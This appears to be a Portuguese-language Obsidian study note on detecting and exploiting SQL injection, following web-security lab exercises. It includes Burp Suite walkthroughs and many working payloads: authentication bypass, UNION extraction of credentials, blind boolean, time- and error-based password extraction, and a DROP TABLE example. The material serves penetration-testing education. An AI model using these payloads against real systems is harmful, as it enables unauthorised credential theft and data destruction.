
---
tags: [security, sqli, sql-injection, pentest, burp, appsec]
aliases:
  - Detecção de SQL Injection
  - Como detectar SQLi
---

## 🔗 Associações no Obsidian

- Hub: [[Vulnerabilidades]]
- SQLi: [[Sqlinjection]], [[Segurança de Aplicativos - Resposta a Incidentes]]
- Testes de API: [[Guia de consulta rápida — Avaliação REST]], [[Pentest]]
- Mitigação e DevSecOps: [[GHAS]], [[Jpainjection]]

---

Você pode detectar injeção de SQL manualmente usando um conjunto sistemático de testes em cada ponto de entrada do aplicativo. Para isso, você normalmente enviaria:

- O caractere de aspas simples `'` deve ser verificado quanto a erros ou outras anomalias.
- Alguma sintaxe específica de SQL que avalia o valor base (original) do ponto de entrada e um valor diferente, e busca diferenças sistemáticas nas respostas do aplicativo.
- Condições booleanas como `OR 1=1` (true) e `OR 1=2` (false) procuram diferenças nas respostas do aplicativo.
- Cargas úteis projetadas para acionar atrasos de tempo quando executadas dentro de uma consulta SQL e para procurar diferenças no tempo de resposta.
- As cargas úteis OAST são projetadas para desencadear uma interação de rede fora da banda quando executadas dentro de uma consulta SQL e monitorar quaisquer interações resultantes.

Alternativamente, você pode encontrar a maioria das vulnerabilidades de injeção de SQL de forma rápida e confiável usando o **Burp Scanner**.

---

## Injeção de SQL em diferentes partes da consulta

A maioria das vulnerabilidades de injeção de SQL ocorre dentro da cláusula `WHERE` de uma consulta `SELECT`.

No entanto, vulnerabilidades de injeção de SQL podem ocorrer em qualquer local da consulta e em diferentes tipos de consulta, como:

- Em instruções `UPDATE`, dentro dos valores atualizados ou da cláusula `WHERE`.
- Em instruções `INSERT`, dentro dos valores inseridos.
- Em instruções `SELECT`, dentro do nome da tabela ou da coluna.
- Em instruções `SELECT`, dentro da cláusula `ORDER BY`.

### Exemplo adicional (ORDER BY):

```sql
SELECT id, name FROM products ORDER BY price
```

~~~~sql
price; DROP TABLE products--
~~~~

## Recuperando dados ocultos

Imagine um aplicativo de compras que exibe produtos em diferentes categorias. Quando o usuário clica na categoria **Presentes**, o navegador solicita a seguinte URL:

~~~~text
https://insecure-website.com/products?category=Gifts
~~~~

Isso faz com que o aplicativo execute a seguinte consulta SQL:

~~~~sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
~~~~

Essa consulta retorna:

- Todos os detalhes (`*`)
- Da tabela `products`
- Onde `category = 'Gifts'`
- E `released = 1`

A condição `released = 1` oculta produtos não lançados (`released = 0`).

### Payload para burlar a lógica:

~~~~sql
' OR 1=1--
~~~~

Consulta resultante:

~~~~sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
~~~~

## Subvertendo a lógica do aplicativo

Imagine um aplicativo de login que executa:

~~~~sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
~~~~

Se retornar um registro, o login é aceito.

### Payload de bypass de autenticação:

~~~~text
administrator'--
~~~~

Consulta final:

~~~~sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
~~~~

Isso ignora completamente a verificação da senha.

## Ataques UNION de Injeção SQL

Quando uma aplicação é vulnerável a injeção de SQL e os resultados da consulta são retornados na resposta, é possível usar o operador `UNION`.

Exemplo:

~~~~sql
SELECT a, b FROM table1
UNION
SELECT c, d FROM table2
~~~~

### Requisitos do UNION:

- Mesmo número de colunas
- Tipos de dados compatíveis

## Determinar o número de colunas necessárias

### Método 1 — `ORDER BY`

~~~~sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
~~~~~

Erro típico:

~~~~text
The ORDER BY position number 3 is out of range
~~~~

Método 2 — `UNION SELECT NULL`

~~~~sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
~~~~

Erro comum:

~~~~text
All queries combined using a UNION must have an equal number of expressions
~~~~

## Sintaxe específica do banco de dados

### Oracle

O Oracle exige `FROM`, usando a tabela especial `DUAL`:

~~~~sql
' UNION SELECT NULL FROM DUAL--
~~~~

### MySQL

- `--` (com espaço)
- Ou comentário com `#`

## Identificar colunas com tipo de dados útil (string)

Após descobrir o número de colunas, teste qual aceita strings:

~~~~sql
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
~~~~

Erro típico:

~~~~text
Conversion failed when converting the varchar value 'a' to data type int
~~~~

## Utilizando UNION para recuperar dados relevantes

Supondo:

- 2 colunas
- Ambas aceitam strings
- Tabela `users` com colunas `username` e `password`

Payload:

~~~~sql
' UNION SELECT username, password FROM users--
~~~~

## Recuperar múltiplos valores em uma única coluna

### Oracle (concatenação com `||`):

~~~~sql
' UNION SELECT username || '~' || password FROM users--
~~~~

Resultado:

~~~~text
administrator~s3cure
wiener~peter
carlos~montoya
~~~~~~

MySQL:

~~~~~sql
CONCAT(username, '~', password)
~~~~~~

PostgreSQL:

~~~~sql
username || '~' || password
~~~~~~

## Analisando o banco de dados em ataques de SQL Injection

Informações importantes incluem:

- Tipo e versão do banco de dados
- Tabelas existentes
- Colunas e tipos de dados

## Consultando tipo e versão do banco

|Banco de dados|Consulta|
|---|---|
|Microsoft SQL / MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|
Exemplo:

~~~~~sql
' UNION SELECT @@version--
~~~~~~

## Listar conteúdo do banco de dados

### Listar tabelas:

~~~~sql
SELECT * FROM information_schema.tables
~~~~

Resultado:

~~~~text
Products
Users
Feedback
~~~~

Listar colunas da tabela Users:

~~~~sql
SELECT * FROM information_schema.columns
WHERE table_name = 'Users'
~~~~

Resultado:

~~~~text
UserId int
Username varchar
Password varchar
~~~~

## Exemplos adicionais de payloads comuns

### Boolean-based:

~~~~sql
' AND 1=1--
' AND 1=2--
~~~~

Time-based (MySQL):

~~~~sql
' AND SLEEP(5)--
~~~~

Time-based (PostgreSQL):

~~~~sql
' AND pg_sleep(5)--
~~~~

Error-based:

~~~~sql
' AND CAST('a' AS int)--
~~~~

## Listar o conteúdo do banco de dados

A maioria dos tipos de banco de dados (exceto o **Oracle**) possui um conjunto de visualizações chamado **information schema**.

Esse esquema fornece informações estruturais sobre o banco de dados, como tabelas, colunas e tipos de dados.

---

### Listando as tabelas do banco de dados

Você pode consultar a view `information_schema.tables` para listar todas as tabelas existentes no banco de dados:

```sql
SELECT * FROM information_schema.tables;
```

Isso retorna uma saída semelhante à seguinte:

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
|--------------|--------------|------------|------------|
| MyDatabase   | dbo          | Products   | BASE TABLE |
| MyDatabase   | dbo          | Users      | BASE TABLE |
| MyDatabase   | dbo          | Feedback   | BASE TABLE |
Essa saída mostra:

- O nome de cada coluna da tabela `Users`
- O tipo de dado associado a cada coluna (`int`, `varchar`, etc.)

Essas consultas são fundamentais em ataques de **SQL Injection do tipo UNION-based**, pois permitem:

- Enumerar tabelas existentes
- Descobrir colunas sensíveis
- Planejar extração de dados relevantes (como usuários e senhas)

## 🧰 Etapa 1 — Interceptar a requisição

1. Abra o **Burp Suite**.

2. Ative o **Proxy** e configure o navegador para utilizá-lo.

3. Navegue até a funcionalidade que define o **filtro de categoria de produtos**.

4. Intercepte a requisição HTTP responsável por definir o parâmetro `category`.

---

## 🔢 Etapa 2 — Determinar o número de colunas e tipos de dados

O objetivo é identificar:

- Quantas colunas a query original retorna

- Quais colunas aceitam dados do tipo **string**

Utilize o payload abaixo no parâmetro `category`:

```sql

'+UNION+SELECT+'abc','def'--

```

### Resultado esperado

- A aplicação não retorna erro
- Os valores `abc` e `def` aparecem na resposta

Isso confirma que:

- A consulta retorna **duas colunas**
- **Ambas aceitam dados textuais** (strings)

## Etapa 3 — Listar as tabelas do banco de dados

Para enumerar as tabelas existentes, utilize o payload:

```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

Analise a resposta e **identifique a tabela relacionada a credenciais de usuários**.

## Etapa 4 — Listar as colunas da tabela de usuários

Após identificar a tabela de usuários (exemplo: `users_abcdef`), utilize o payload abaixo para descobrir suas colunas:

```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

### Objetivo

- Identificar as colunas que armazenam:
    - Nome de usuário
    - Senha

## Etapa 5 — Extrair usernames e passwords

Depois de identificar os nomes das colunas (exemplo: `username_abcdef` e `password_abcdef`), utilize o payload:

```sql
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```

### Resultado esperado

- Lista de usuários e senhas exibidas na resposta da aplicação

## O que é Injeção SQL Cega (Blind SQL Injection)

A **injeção SQL cega** ocorre quando um aplicativo é vulnerável a injeção SQL, mas suas respostas HTTP **não contêm os resultados da consulta SQL** nem **detalhes de erros do banco de dados**.

Devido a isso, muitas técnicas tradicionais — como ataques `UNION` — **não são eficazes**, pois dependem da visualização direta dos resultados da consulta injetada.

Ainda assim, é possível explorar a injeção SQL cega para acessar dados não autorizados, utilizando **técnicas alternativas**.

---

## Exploração de Injeção SQL Cega por Respostas Condicionais

Considere um aplicativo que utiliza **cookies de rastreamento** para coletar dados analíticos. As requisições incluem um cabeçalho como:

```http

Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

```

Quando uma requisição contendo o cookie `TrackingId` é processada, o aplicativo executa a seguinte consulta SQL para verificar se o usuário é conhecido:

```sql
SELECT TrackingId
FROM TrackedUsers
WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Essa consulta é vulnerável a injeção de SQL, porém **os resultados não são retornados diretamente ao usuário**.

Entretanto, o comportamento do aplicativo **muda dependendo do resultado da consulta**:

- Se a consulta retornar dados → a aplicação exibe a mensagem **"Bem-vindo de volta"**
- Se não retornar dados → a mensagem **não é exibida**

Esse comportamento é suficiente para explorar a vulnerabilidade de **injeção SQL cega**, pois permite inferir informações a partir de **respostas condicionais**.

Considere o envio de duas requisições consecutivas com os seguintes valores no cookie `TrackingId`:

```text
xyz' AND '1'='1
xyz' AND '1'='2
```

### Análise do comportamento:

- **Primeiro payload**
    
    - A condição `AND '1'='1'` é verdadeira
    - A consulta retorna dados
    - A mensagem **"Bem-vindo de volta"** é exibida
- **Segundo payload**
    
    - A condição `AND '1'='2'` é falsa
    - A consulta não retorna dados
    - A mensagem **não** é exibida

Isso permite ao atacante **avaliar condições booleanas arbitrárias**, possibilitando a extração de dados **um bit ou caractere por vez**.

## Extração de Dados Caractere por Caractere

Suponha que exista uma tabela chamada `Users` com as colunas `Username` e `Password`, e que haja um usuário chamado `Administrator`.

É possível descobrir a senha desse usuário testando **um caractere por vez**, utilizando funções de substring.

### Exemplo — Testando o primeiro caractere da senha

#### Teste 1

```sql
xyz' AND SUBSTRING(
  (SELECT Password FROM Users WHERE Username = 'Administrator'),
  1, 1
) > 'm
```

- Retorna **"Bem-vindo de volta"**
- Indica que o primeiro caractere da senha é **maior que `m`**

#### Teste 2

```sql
xyz' AND SUBSTRING(
  (SELECT Password FROM Users WHERE Username = 'Administrator'),
  1, 1
) > 't
```

- **Não** retorna a mensagem
- Indica que o caractere **não é maior que `t`**

### Teste 3

```sql
xyz' AND SUBSTRING(
  (SELECT Password FROM Users WHERE Username = 'Administrator'),
  1, 1
) = 's
```

- Retorna **"Bem-vindo de volta"**
- Confirma que o primeiro caractere da senha é **`s`**

Repetindo esse processo para cada posição do campo `Password`, é possível:
- Extrair a senha completa do usuário `Administrator`
- Sem ver mensagens de erro
- Sem visualizar resultados diretos da consulta SQL

# Exploração de Blind SQL Injection via Cookie (TrackingId)

Este documento descreve **passo a passo** o processo de exploração de uma **Blind SQL Injection (boolean-based)** utilizando o **Burp Suite**, com base em um cookie vulnerável chamado `TrackingId`.

> ⚠️ **Aviso ético**

> Este material é **exclusivamente educacional**, devendo ser utilizado apenas em **laboratórios, CTFs ou ambientes com autorização explícita**.

---

## 📍 Contexto da Vulnerabilidade

A aplicação utiliza um cookie de rastreamento para identificar usuários recorrentes:

```http

Cookie: TrackingId=xyz

```

Internamente, a aplicação executa uma consulta SQL semelhante a:

```sql
SELECT TrackingId
FROM TrackedUsers
WHERE TrackingId = '<valor_do_cookie>'
```

A resposta da aplicação **varia conforme o resultado da consulta**:

- Se a consulta retorna dados → aparece a mensagem **"Welcome back"**
- Se não retorna dados → a mensagem **não aparece**

Verificação da Existência da Tabela `users`

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

✔️ Resultado esperado:

- A mensagem **"Welcome back"** aparece
✅ Confirma que:
- Existe uma tabela chamada `users`
- O banco permite subqueries
## Descoberta do Tamanho da Senha

Para descobrir o comprimento da senha, utilizamos a função `LENGTH()`.

### Teste inicial

```text
TrackingId=xyz' AND (SELECT 'a' FROM users 
WHERE username='administrator' AND LENGTH(password)>1)='a
```

```text
TrackingId=xyz' AND (SELECT 'a' FROM users 
WHERE username='administrator' AND LENGTH(password)>3)='a
```

Quando a mensagem **"Welcome back"** deixar de aparecer, você identificou o limite.

## Extração da Senha (Caractere por Caractere)

Após descobrir o tamanho da senha, é necessário identificar cada caractere individualmente.

Devido ao grande número de requisições, utilizamos o **Burp Intruder**.

### Enviar a requisição para o Burp Intruder

1. No Burp Proxy ou Repeater, clique com o botão direito na requisição
2. Selecione **Send to Intruder**

Payload base para extração do primeiro caractere

```text
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) 
FROM users WHERE username='administrator')='a
```

Essa query:

- Extrai **1 caractere**
- Na **posição 1**
- Da senha do usuário `administrator`

### Definição da posição de payload

Coloque marcadores de payload apenas no caractere final:

```text
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) 
FROM users WHERE username='administrator')='§a§
```

### Payloads

- Tipo: **Simple list**
- Conjunto de caracteres:
    
    - `a` a `z`
    - `0` a `9`

### Grep - Match

1. Vá até a aba **Settings**
2. Em **Grep - Match**, remova entradas existentes
3. Adicione o valor:

```text
<texto do retorno de qwery valida>

exemplo:

'Welcome back'

```

Isso permitirá identificar automaticamente a resposta correta.

## Execução do Ataque

1. Clique em **Start attack**
2. Observe os resultados
3. A linha que contiver um ✔️ na coluna **Welcome back** indica:

    - O caractere correto da posição testada


📌 Exemplo:

- Se o payload `s` retornar "Welcome back"
- O primeiro caractere da senha é `s`

## Repetição para Todas as Posições

Para extrair o próximo caractere:

### Ajuste do offset

```text
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) 
FROM users WHERE username='administrator')='a
```

Repita o processo para:

- Offset 3
- Offset 4
- Offset 20

Até reconstruir **toda a senha**.

## Injeção de SQL baseada em erros

A **injeção de SQL baseada em erros** refere-se a cenários em que é possível usar **mensagens de erro** para extrair ou inferir dados confidenciais do banco de dados, mesmo em contextos de **injeção SQL cega**. As possibilidades dependem da configuração do banco de dados e dos tipos de erros que podem ser acionados.

- É possível induzir o aplicativo a retornar **uma resposta de erro específica** com base no resultado de uma **expressão booleana**.

- É possível gerar **mensagens de erro que exibem dados retornados pela consulta**, transformando vulnerabilidades de SQL Injection que seriam invisíveis em vulnerabilidades visíveis.

---

## Exploração de injeção SQL cega através do acionamento de erros condicionais

Algumas aplicações executam consultas SQL, mas **seu comportamento não se altera**, independentemente de a consulta retornar dados. Nesses casos, a técnica de **respostas condicionais booleanas** não funciona, pois a aplicação responde da mesma forma para condições verdadeiras ou falsas.

No entanto, muitas vezes é possível induzir a aplicação a retornar **respostas diferentes quando ocorre um erro SQL**. Para isso, a consulta é modificada de modo a **causar um erro no banco de dados somente se a condição for verdadeira**.

Frequentemente, um erro não tratado lançado pelo banco de dados provoca alguma diferença perceptível na resposta da aplicação, como:

- Mensagem de erro

- Código HTTP diferente

- Página de erro genérica

Isso permite **inferir a veracidade da condição injetada**.

---

## Exploração de injeção SQL cega através do acionamento de erros condicionais — Continuação

Para entender como essa técnica funciona, suponha que duas requisições sejam enviadas em sequência, contendo os seguintes valores no cookie `TrackingId`:

```sql

xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a

```

```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Essas entradas utilizam a palavra-chave `CASE` para testar uma condição e retornar expressões diferentes conforme o resultado:

- **Primeira entrada**
    
    - A condição `(1=2)` é falsa
    - A expressão retorna `'a'`
    - Nenhum erro ocorre
    
- **Segunda entrada**
    
    - A condição `(1=1)` é verdadeira
    - A expressão retorna `1/0`
    - Ocorre um **erro de divisão por zero**

Se esse erro provocar uma diferença observável na resposta HTTP da aplicação, é possível utilizá-lo para determinar se a condição injetada é verdadeira.

```sql
xyz' AND (
  SELECT CASE 
    WHEN (Username = 'Administrator' 
          AND SUBSTRING(Password, 1, 1) > 'm') 
    THEN 1/0 
    ELSE 'a' 
  END 
  FROM Users
)='a
```

### Interpretação:

- Se a condição for verdadeira:
    
    - O banco tenta executar `1/0`
    - Um erro ocorre
    - A resposta da aplicação muda

- Se a condição for falsa:
    
    - O valor `'a'` é retornado
    - Nenhum erro ocorre
    - A resposta permanece normal


Repetindo esse processo:

- Variando a posição do caractere (`SUBSTRING(Password, n, 1)`)
- Comparando com diferentes valores (`> 'm'`, `= 's'`, etc.)

é possível **reconstruir toda a senha**, mesmo sem visualizar diretamente os dados do banco.



---

## Observação final ⚠️

> Todo o conteúdo aqui apresentado deve ser utilizado **exclusivamente para fins educacionais, laboratoriais ou em ambientes autorizados** (como CTFs, labs e testes de segurança com permissão).
